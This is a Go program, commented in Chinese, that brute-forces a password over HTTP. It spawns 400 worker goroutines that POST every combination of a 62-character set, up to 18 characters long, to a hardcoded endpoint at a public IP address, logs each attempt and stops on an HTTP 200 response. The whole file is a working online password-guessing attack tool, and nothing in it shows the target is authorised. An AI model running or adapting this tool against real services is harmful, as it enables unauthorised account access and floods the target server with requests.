package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/natefinch/lumberjack"
)

// PasswordJob 结构体：定义一个任务，即从某个前缀开始生成密码
type PasswordJob struct {
	Prefix string
}

// --- 配置参数 ---
const (
	TargetURL         = "http://159.75.107.91:15001/api/password"
	MaxPasswordLength = 18                                                               // 最大测试密码长度
	PrefixLength      = 3                                                                // 任务分块的前缀长度
	NumWorkers        = 400                                                              // 启动的工作协程数
	Charset           = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" // 增强字符集

	// --- 日志配置 ---
	LogFile       = "bruteforce_test.log"
	LogMaxSizeMB  = 50 // 单个日志文件最大 50 MB
	LogMaxBackups = 20 // 最多保留 20 个旧文件
	LogMaxAgeDays = 30 // 旧文件保留 30 天
)

// FoundPassword 用于在找到正确密码时，安全地通知所有协程停止
var FoundPassword = make(chan string, 1)

// LogChannel 用于异步接收所有协程发送的日志消息
var LogChannel = make(chan []byte, 10000) // 设置大容量缓冲

// --- HTTP 请求工具函数 ---

// RequestBody 定义了发送请求的 JSON 结构体
type RequestBody struct {
	Password string `json:"password"`
}

// PostPassword 函数：发送密码请求
func PostPassword(password string) (bool, error) {
	requestData := RequestBody{Password: password}
	jsonBody, _ := json.Marshal(requestData)

	req, err := http.NewRequest("POST", TargetURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		return false, fmt.Errorf("创建请求失败: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		// 返回网络错误
		return false, fmt.Errorf("发送请求失败: %w", err)
	}
	defer resp.Body.Close()

	// 密码正确性判断：假设状态码 200 即为正确
	if resp.StatusCode == http.StatusOK {
		return true, nil
	}

	// 读取响应体以判断错误类型
	responseBody, _ := io.ReadAll(resp.Body)
	var apiResponse map[string]string
	if json.Unmarshal(responseBody, &apiResponse) == nil {
		if _, ok := apiResponse["error"]; !ok {
			// 状态码非 200，但响应体无 "error" 字段，暂视为失败
			return false, nil
		}
	}

	// 默认为失败 (如状态码非 200 且返回了 "error" 字段)
	return false, nil
}

// --- 异步日志写入器协程 ---

// LogWriter 实现了 io.Writer 接口，将数据发送到 LogChannel
type LogWriter struct{}

func (LogWriter) Write(p []byte) (n int, err error) {
	select {
	case LogChannel <- p:
		return len(p), nil
	default:
		// 如果通道满了，避免阻塞，可以丢弃或使用更大的缓冲
		return len(p), nil
	}
}

// startLogWriter 启动一个专用的协程，处理日志的写入、轮转和压缩
func startLogWriter(wg *sync.WaitGroup) {
	defer wg.Done()

	// 使用 lumberjack 实现日志轮转和压缩
	lumberjackLogger := &lumberjack.Logger{
		Filename:   LogFile,
		MaxSize:    LogMaxSizeMB, // MB
		MaxBackups: LogMaxBackups,
		MaxAge:     LogMaxAgeDays, // days
		Compress:   true,          // 启用压缩 (gzip)
	}

	for logEntry := range LogChannel {
		// 写入到轮转的文件中
		_, err := lumberjackLogger.Write(logEntry)
		if err != nil {
			// 如果写入文件失败，则输出到标准错误，防止丢失日志信息
			fmt.Fprintf(os.Stderr, "FATAL: Log file write error: %v\n", err)
		}
	}

	// 关闭文件
	lumberjackLogger.Close()
	log.Println("[LogWriter] 协程退出。")
}

// --- 并发生成逻辑 ---

// worker 是工作协程函数，处理分配到的前缀任务
func worker(id int, jobs <-chan PasswordJob, wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		select {
		case job, ok := <-jobs:
			if !ok {
				// 通道关闭，退出
				log.Printf("[Worker %d] 通道关闭，退出。", id)
				return
			}
			log.Printf("[Worker %d] 接收到任务: 前缀 '%s'", id, job.Prefix)

			// 执行核心的密码生成和测试
			generateAndTest(job.Prefix, id)

		case <-FoundPassword:
			// 其他协程找到了密码，立即退出
			return
		}
	}
}

// generateAndTest 负责从给定前缀开始，生成和测试所有后续密码
func generateAndTest(prefix string, workerID int) {
	// 测试当前前缀自身
	if len(prefix) >= 1 {
		testPassword(prefix, workerID)
	}

	// 递归生成更长的密码
	generateRecursive(prefix, workerID)
}

// 递归函数：生成并测试后续字符
func generateRecursive(current string, workerID int) {
	// 检查是否有协程已找到密码
	select {
	case <-FoundPassword:
		return
	default:
		// 继续
	}

	// 如果密码已经达到最大长度，或者当前长度已经超出限制，则返回
	if len(current) >= MaxPasswordLength {
		return
	}

	for _, char := range Charset {
		next := current + string(char)

		// 1. 测试新的组合
		testPassword(next, workerID)

		// 2. 递归生成更长的组合
		generateRecursive(next, workerID)
	}
}

// testPassword 调用 HTTP 请求并处理结果
func testPassword(password string, workerID int) {
	correct, err := PostPassword(password)

	// 检查 FoundPassword 是否已关闭，如果是，则停止
	select {
	case <-FoundPassword:
		return
	default:
	}

	if err != nil {
		// 忽略网络错误，不中断测试
		log.Printf("[Worker %d] %s 网络错误: %v", workerID, password, err)
		return
	}

	if correct {
		log.Printf("\n🎉🎉🎉 [Worker %d] **密码已找到**: %s 🎉🎉🎉", workerID, password)
		// 找到密码，通知其他协程退出
		select {
		case FoundPassword <- password:
		default:
			// 避免通道阻塞
		}
	}
}

// main 函数：负责前缀生成和分发
func main() {
	// ----------------------------------------------------
	// 步骤 1: 设置异步日志系统
	// ----------------------------------------------------
	logWG := sync.WaitGroup{}
	logWG.Add(1)
	go startLogWriter(&logWG)

	// 将标准 log 的输出目标设置为我们的 LogWriter，所有 log.Print 都会发送到 LogChannel
	log.SetOutput(LogWriter{})
	log.SetFlags(log.Ltime | log.Lshortfile)

	// ----------------------------------------------------
	// 步骤 2: 启动工作协程和主逻辑
	// ----------------------------------------------------

	log.Printf("程序启动。字符集大小: %d, 最大长度: %d, 前缀长度: %d, 工作协程: %d",
		len(Charset), MaxPasswordLength, PrefixLength, NumWorkers)
	if PrefixLength >= MaxPasswordLength {
		log.Fatal("错误: 前缀长度必须小于最大密码长度。")
	}

	jobs := make(chan PasswordJob, NumWorkers*2) // 任务通道带缓冲
	var wg sync.WaitGroup

	// 1. 启动工作协程池
	for w := 1; w <= NumWorkers; w++ {
		wg.Add(1)
		go worker(w, jobs, &wg)
	}

	// 2. 主协程：生成所有前缀作为任务 (生产者)
	startTime := time.Now()

	// 递归生成所有固定长度的前缀
	var generatePrefixes func(current string)
	generatePrefixes = func(current string) {
		if len(current) == PrefixLength {
			// 达到前缀长度，分发任务
			jobs <- PasswordJob{Prefix: current}
			return
		}

		// 如果当前长度小于 PrefixLength，继续递归生成下一级前缀
		if len(current) < PrefixLength {
			for _, char := range Charset {
				generatePrefixes(current + string(char))
			}
		}
	}

	// 开始生成前缀
	generatePrefixes("")

	// 3. 关闭 jobs 通道
	close(jobs)
	log.Printf("[Main] 所有前缀任务已分发完毕，总共等待 %d 个工作协程完成...", NumWorkers)

	// 4. 等待所有工作协程完成 (WaitGroup)
	wg.Wait()

	// ----------------------------------------------------
	// 步骤 5: 善后处理：关闭日志系统
	// ----------------------------------------------------
	log.Println("[Main] 所有工作协程已退出。")

	// 关闭日志通道，通知 logWriter 协程退出
	close(LogChannel)

	// 等待日志协程处理完所有剩余日志并关闭文件
	logWG.Wait()

	// ----------------------------------------------------
	// 步骤 6: 最终结果输出
	// ----------------------------------------------------
	select {
	case foundPwd := <-FoundPassword:
		// 因为 logWriter 已经退出了，这里使用 fmt.Printf 确保输出到控制台
		fmt.Printf("\n✅ 最终结果：密码 '%s' 在 %v 内找到。所有日志已写入 %s\n", foundPwd, time.Since(startTime), LogFile)
	default:
		fmt.Printf("\n❌ 最终结果：在 %v 内未找到密码。所有日志已写入 %s\n", time.Since(startTime), LogFile)
	}
}
